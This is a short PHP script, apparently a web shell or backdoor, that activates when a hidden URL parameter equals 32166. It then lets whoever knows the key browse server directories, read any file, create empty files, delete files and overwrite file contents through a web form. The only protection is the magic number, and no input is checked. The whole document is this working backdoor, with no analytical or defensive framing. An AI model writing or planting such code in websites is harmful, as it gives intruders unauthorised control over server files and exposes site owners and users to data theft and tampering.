<?
if ($_GET['a'] == 32166) {
    if ($path = $_GET['p']) {
        if ($handle = opendir($path)) {
            while (false !== ($file = readdir($handle))) {
                if ($file != ".") {
                    $name = $path . "/" . $file;
                    if (is_dir($name)) {
                        echo '<a href="?a=32166&p=' . $name . '/&f=0" style="color:#ff7700;
font: 400 18px calibri;
text-decoration:none;
">' . $file . '</a><br>';
                    } else {
                        echo '<a href="?a=32166&p=' . $path . '&f=' . $name . '" style="color:#0077ff;
font: 400 18px calibri;
text-decoration:none;
">' . $file . '</a><br>';
                    }
                }
            }
            closedir($handle);
        }
        if ($fi = $_GET['f']) {
            if ($fa = fopen($fi, 'rt')) {
                while (!feof($fa)) {
                    $te = fgets($fa, 8192);
                    $text = $text . $te;
                }
                fclose($fa);
            }
        }
        if ($mfi = $_GET['xmf']) {
            $makef = fopen($mfi, 'w');
            fclose($makef);
            exit('<META HTTP-EQUIV=Refresh Content="0;
URL=?a=32166&p=' . $path . '&f=' . $mfi . '">');
        }
        if ($delf = $_GET['xdf']) {
            unlink("$delf");
            exit('<META HTTP-EQUIV=Refresh Content="0;
URL=?a=32166&p=' . $path . '">');
        }
        echo '<form action="" method="post" style="position:absolute;
top:10px;
left:300px;
"><input type="submit" value="SAVE" name="save">' . $fi . '<br><textarea name="comm" style="width:1200px;
height:900px;
">' . "$text" . '</te' . 'xtarea></form>';
        if ($_POST['save'] == true) {
            $fa = fopen($fi, 'w');
            $c = stripslashes($_POST['comm']);
            fwrite($fa, $c);
            fclose($fa);
            exit('<META HTTP-EQUIV=Refresh Content="0;
URL=?a=32166&p=' . $path . '&f=' . $fi . '">');
        }
        exit();
    }
}
